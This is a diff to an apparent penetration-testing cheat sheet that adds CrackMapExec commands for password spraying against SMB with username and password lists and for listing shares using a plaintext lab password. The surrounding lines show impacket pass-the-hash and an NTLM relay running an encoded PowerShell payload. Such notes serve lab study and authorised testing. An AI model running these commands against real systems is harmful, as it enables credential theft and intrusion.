@@ -378,6 +378,21 @@ impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
 impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JABjAGwAaQBlAG4AdA..."
 ~~~
 
+## CrackMapExec
+
+### Checking for valid credentials with CrackMapExec
+
+~~~ bash
+crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
+~~~
+
+### Listing SMB shares
+
+~~~ bash
+crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
+~~~
+
+
 # MSSQL - 1433
 
 ## MSSQL Connection
